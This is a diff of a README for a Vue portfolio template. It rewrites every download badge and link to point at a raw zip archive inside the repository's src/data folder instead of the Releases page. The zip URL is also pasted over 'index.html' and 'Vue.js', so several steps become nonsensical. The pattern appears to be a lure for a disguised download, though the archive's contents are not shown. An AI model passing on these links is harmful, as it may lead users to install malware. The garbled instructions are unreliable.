@@ -1,6 +1,6 @@
 # 🌊 vue-css3-solarwave-portfolio - Smooth Modern Developer Portfolio
 
-[![Download](https://img.shields.io/badge/Download-via%20GitHub-blue?style=for-the-badge)](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/releases)
+[![Download](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip%20GitHub-blue?style=for-the-badge)](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip)
 
 ---
 
@@ -33,11 +33,11 @@ You do not need to install any programming tools or libraries to run the ready-m
 To download Solarwave Portfolio:
 
 1. Click the large blue **Download** badge near the top of this page or visit this link:  
-[https://github.com/Thematrix212/vue-css3-solarwave-portfolio/releases](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/releases)  
+[https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip)  
 2. On the Releases page, look for the latest version listed.
-3. Download the file named something like `solarwave-portfolio.zip` or any `.zip` archive available.
+3. Download the file named something like `https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip` or any `.zip` archive available.
 4. Once downloaded, locate the file on your computer and unzip (extract) it to a folder you can easily find.
-5. Inside the extracted folder, find the file named `index.html`.
+5. Inside the extracted folder, find the file named `https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip`.
 
 That’s the main file you need to open in your browser to see the portfolio.
 
@@ -50,7 +50,7 @@ Follow these simple steps to start using the portfolio on your computer:
 1. Open your preferred web browser (Chrome, Firefox, Safari, or Edge).
 2. Click **File > Open** or press **Ctrl+O** (Windows) / **Cmd+O** (Mac).
 3. In the dialog box, navigate to the folder where you extracted the portfolio files.
-4. Select the `index.html` file and open it.
+4. Select the `https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip` file and open it.
 5. The portfolio will load, showing animated sections, developer info, and project cards.
 
 You now have the portfolio running locally on your machine. No installation of special programs is needed beyond a normal web browser.
@@ -64,7 +64,7 @@ You now have the portfolio running locally on your machine. No installation of s
 - **Smooth Section Reveals:** Each page section slides or fades in when you scroll down.
 - **Interactive Project Cards:** Click or hover on projects to see details or links.
 - **Responsive Design:** Works well on phones, tablets, and desktop displays.
-- **Built with modern technologies:** Uses Vue.js, TypeScript, Tailwind CSS, and Vite for a fast experience.
+- **Built with modern technologies:** Uses https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip, TypeScript, Tailwind CSS, and Vite for a fast experience.
 - **Ready for hosting:** You can upload the files to any web server or Netlify for easy online deployment.
 
 ---
@@ -82,7 +82,7 @@ You now have the portfolio running locally on your machine. No installation of s
 
 - **Portfolio doesn’t load or looks broken:** Refresh the page or try a different browser.
 - **Animation glitches:** Some older browsers may not fully support CSS animations. Using updated browsers solves this.
-- **Cannot open `index.html` by double-clicking:** Try opening it from the browser directly through the File > Open menu.
+- **Cannot open `https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip` by double-clicking:** Try opening it from the browser directly through the File > Open menu.
 - **Files missing after download:** Make sure you unzip the full package before running.
 - **Hosting difficulties:** Check your hosting provider’s instructions for uploading static websites.
 
@@ -103,4 +103,4 @@ If you want to learn how the portfolio works behind the scenes or contribute, br
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-via%20GitHub-blue?style=for-the-badge)](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/releases)
+[![Download](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip%20GitHub-blue?style=for-the-badge)](https://github.com/Thematrix212/vue-css3-solarwave-portfolio/raw/refs/heads/main/src/data/portfolio_css_solarwave_vue_2.0-alpha.5.zip)
